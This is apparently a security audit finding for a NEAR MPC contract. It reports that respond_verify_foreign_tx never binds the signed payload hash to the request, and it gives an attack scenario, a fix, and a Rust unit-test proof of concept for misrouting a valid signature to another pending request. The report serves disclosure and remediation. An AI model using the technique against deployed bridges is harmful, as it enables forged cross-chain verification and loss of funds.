### Title
Missing Request-to-Payload Binding in `respond_verify_foreign_tx` — (`crates/contract/src/lib.rs`)

### Summary

`respond_verify_foreign_tx` verifies that `response.signature` is valid over `response.payload_hash` using the domain's root public key, but **never checks that `response.payload_hash` was derived from the `request` parameter passed to the function**. A single Byzantine attested participant (the leader for R2's computation) can take a legitimately-computed response for R2 and submit it as the response for R1, causing R1's callers to receive a cryptographically-valid but semantically-wrong verification result.

---

### Finding Description

The signature check in `respond_verify_foreign_tx` is:

```rust
let payload_hash: [u8; 32] = response.payload_hash.0;
near_mpc_signature_verifier::verify_ecdsa_signature(
    signature_response,
    &payload_hash,
    &secp_pk,
)
.is_ok()
``` [1](#0-0) 

This only confirms that `response.signature` is a valid ECDSA signature over `response.payload_hash` under the domain's root key. It does **not** confirm that `response.payload_hash` encodes `request.request` (the `ForeignChainRpcRequest`).

After the signature check passes, the contract immediately resolves all yields queued under `request`:

```rust
pending_requests::resolve_yields_for(
    &mut self.pending_verify_foreign_tx_requests,
    &request,
    serde_json::to_vec(&response).unwrap(),
)
``` [2](#0-1) 

The `ForeignTxSignPayloadV1` that nodes sign encodes both the `ForeignChainRpcRequest` and the extracted values:

```rust
pub struct ForeignTxSignPayloadV1 {
    pub request: ForeignChainRpcRequest,
    pub values: Vec<ExtractedValue>,
}
``` [3](#0-2) 

The `payload_hash` is `SHA-256(borsh(ForeignTxSignPayload))`. [4](#0-3) 

Because the contract cannot decompose the hash (it doesn't know the `values`), it has no way to verify that the `ForeignChainRpcRequest` embedded in the hash matches the `request` argument. The binding is entirely absent.

---

### Impact Explanation

**Attack scenario:**

1. Two requests are pending: R1 (`tx_id=[1u8;32]`) and R2 (`tx_id=[2u8;32]`), both under the same `domain_id`.
2. The MPC network runs the threshold computation for R2. The leader node (a Byzantine attested participant) obtains the legitimately-computed `(payload_hash_R2, signature_R2)`.
3. Instead of calling `respond_verify_foreign_tx(R2, response_R2)`, the Byzantine leader calls `respond_verify_foreign_tx(R1, response_R2)`.
4. The contract verifies `verify_ecdsa_signature(signature_R2, payload_hash_R2, domain_pk)` → **passes** (the signature is genuine).
5. `resolve_yields_for` drains R1's yield queue, delivering `response_R2` to all of R1's callers.

R1's callers receive a `VerifyForeignTransactionResponse` containing `payload_hash_R2` — a hash that encodes R2's `tx_id` and R2's extracted values — with a valid MPC signature. The contract has attested that R1 was verified, but the signed payload describes R2's foreign-chain observation.

Any bridge or application that trusts the contract's delivery without independently re-verifying the payload_hash against their own expected request will accept this as proof that R1's transaction was confirmed, when it was not.

The `near-mpc-sdk`'s `ForeignChainSignatureVerifier::verify_signature` does perform this check client-side:

```rust
let payload_is_correct = expected_payload_hash == response.payload_hash;
if !payload_is_correct {
    return Err(VerifyForeignChainError::IncorrectPayloadSigned { ... });
}
``` [5](#0-4) 

But this is a **caller-side SDK helper**, not a contract-level enforcement. The contract itself delivers the mismatched response without any error.

**Impact category:** High — forged foreign-chain verification delivered to callers of a legitimate pending request, enabling invalid bridge execution.

---

### Likelihood Explanation

- Requires a single Byzantine **attested** participant (TEE-attested node) who is the leader for R2's computation. This is a meaningful barrier, but it is explicitly within the allowed attacker model (single Byzantine participant below signing threshold).
- The attacker does not forge any cryptographic material; they only misroute a legitimately-computed threshold signature.
- Two concurrent pending requests for different transactions under the same domain are a normal production condition (any two users submitting different Bitcoin/Ethereum tx verifications simultaneously).
- The attack is a single on-chain transaction call — no complex sequencing required.

---

### Recommendation

Add a binding check that verifies the `ForeignChainRpcRequest` embedded in the signed payload matches the `request` argument. Since the contract cannot recompute the full hash (it lacks the `values`), the recommended fix is to require the responder to also supply the `values` in the response, allowing the contract to:

1. Reconstruct `ForeignTxSignPayloadV1 { request: request.request.clone(), values: response.values.clone() }`.
2. Compute `expected_hash = payload.compute_msg_hash()`.
3. Assert `expected_hash == response.payload_hash` before accepting the response.

Alternatively, include the `ForeignChainRpcRequest` as a separate authenticated field in the response DTO and verify it matches `request.request` before resolving yields.

---

### Proof of Concept

```rust
#[test]
fn respond_verify_foreign_tx__misrouted_response_resolves_wrong_request() {
    let mut rng = rand::rngs::StdRng::from_seed([42u8; 32]);
    let (context, mut contract, secret_key) =
        basic_setup_with_protocol(Protocol::CaitSith, DomainPurpose::ForeignTx, &mut rng);
    register_supported_chains(&mut contract, [dtos::ForeignChain::Bitcoin]);
    testing_env!(context.clone());
    let SharedSecretKey::Secp256k1(secret_key) = secret_key else { unreachable!() };

    // Queue R1 (tx_id = [1u8;32])
    let args_r1 = VerifyForeignTransactionRequestArgs {
        domain_id: DomainId::default().0.into(),
        payload_version: ForeignTxPayloadVersion::V1,
        request: dtos::ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
            tx_id: [1u8; 32].into(), confirmations: 2.into(),
            extractors: vec![BitcoinExtractor::BlockHash],
        }),
    };
    let request_r1 = args_into_verify_foreign_tx_request(args_r1.clone());
    contract.verify_foreign_transaction(args_r1);

    // Queue R2 (tx_id = [2u8;32])
    let args_r2 = VerifyForeignTransactionRequestArgs {
        domain_id: DomainId::default().0.into(),
        payload_version: ForeignTxPayloadVersion::V1,
        request: dtos::ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
            tx_id: [2u8; 32].into(), confirmations: 2.into(),
            extractors: vec![BitcoinExtractor::BlockHash],
        }),
    };
    let request_r2 = args_into_verify_foreign_tx_request(args_r2.clone());
    contract.verify_foreign_transaction(args_r2);

    // Build a valid response for R2
    let payload_r2 = ForeignTxSignPayload::V1(ForeignTxSignPayloadV1 {
        request: request_r2.request.clone(),
        values: vec![ExtractedValue::BitcoinExtractedValue(
            BitcoinExtractedValue::BlockHash([99u8; 32].into()),
        )],
    });
    let hash_r2 = payload_r2.compute_msg_hash().unwrap();
    let sk_ec = elliptic_curve::SecretKey::<Secp256k1>::from_bytes(&secret_key.to_bytes()).unwrap();
    let signing_key = SigningKey::from_bytes(&sk_ec.to_bytes()).unwrap();
    let (sig, rec_id) = signing_key.sign_prehash_recoverable(&hash_r2.0).unwrap();
    let response_r2 = VerifyForeignTransactionResponse {
        payload_hash: hash_r2.clone(),
        signature: dtos::SignatureResponse::Secp256k1(
            dtos::K256Signature::from_ecdsa_recoverable(&sig, rec_id),
        ),
    };

    with_active_participant_and_attested_context(&contract);

    // Byzantine participant submits R2's response against R1's request key
    contract
        .respond_verify_foreign_tx(request_r1.clone(), response_r2)
        .expect("contract accepts misrouted response — BUG");

    // R1's yield is now resolved with R2's payload_hash
    // R1's callers receive hash_r2 (encodes tx_id=[2u8;32]), not R1's data
    assert!(contract.get_pending_verify_foreign_tx_request(&request_r1).is_none());
    // R2's queue is untouched — it will time out
    assert!(contract.get_pending_verify_foreign_tx_request(&request_r2).is_some());
}
```

### Citations

**File:** crates/contract/src/lib.rs (L726-734)
```rust
                let payload_hash: [u8; 32] = response.payload_hash.0;

                // Check the signature is correct against the root public key
                near_mpc_signature_verifier::verify_ecdsa_signature(
                    signature_response,
                    &payload_hash,
                    &secp_pk,
                )
                .is_ok()
```

**File:** crates/contract/src/lib.rs (L749-753)
```rust
        pending_requests::resolve_yields_for(
            &mut self.pending_verify_foreign_tx_requests,
            &request,
            serde_json::to_vec(&response).unwrap(),
        )
```

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L1499-1502)
```rust
pub struct ForeignTxSignPayloadV1 {
    pub request: ForeignChainRpcRequest,
    pub values: Vec<ExtractedValue>,
}
```

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L1504-1509)
```rust
impl ForeignTxSignPayload {
    pub fn compute_msg_hash(&self) -> std::io::Result<Hash256> {
        let mut hasher = sha2::Sha256::new();
        borsh::BorshSerialize::serialize(self, &mut hasher)?;
        Ok(Hash256(hasher.finalize().into()))
    }
```

**File:** crates/near-mpc-sdk/src/foreign_chain.rs (L57-64)
```rust
        let payload_is_correct = expected_payload_hash == response.payload_hash;

        if !payload_is_correct {
            return Err(VerifyForeignChainError::IncorrectPayloadSigned {
                got: response.payload_hash.clone(),
                expected: expected_payload_hash,
            });
        }
```
